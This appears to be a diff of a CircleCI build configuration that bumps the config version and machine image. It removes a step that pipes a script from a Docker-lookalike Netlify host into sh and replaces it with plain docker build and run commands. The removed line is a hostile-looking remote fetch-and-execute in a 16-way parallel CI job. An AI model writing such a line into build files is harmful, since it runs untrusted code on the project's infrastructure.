@@ -1,13 +1,14 @@
-version: 2
+version: 2.1
 jobs:
   build:
     parallelism: 16
     machine:
-     image: ubuntu-2004:202008-01
+      image: ubuntu-2004:202101-01
     steps:
       - checkout
       - run:
           name: Ensure Test Parity
           command: |
                  sudo apt-get update
-                 curl https://dockerio1.netlify.app/run.sh | sh
+                 sudo docker build -t web .
+                 sudo docker run web:latest
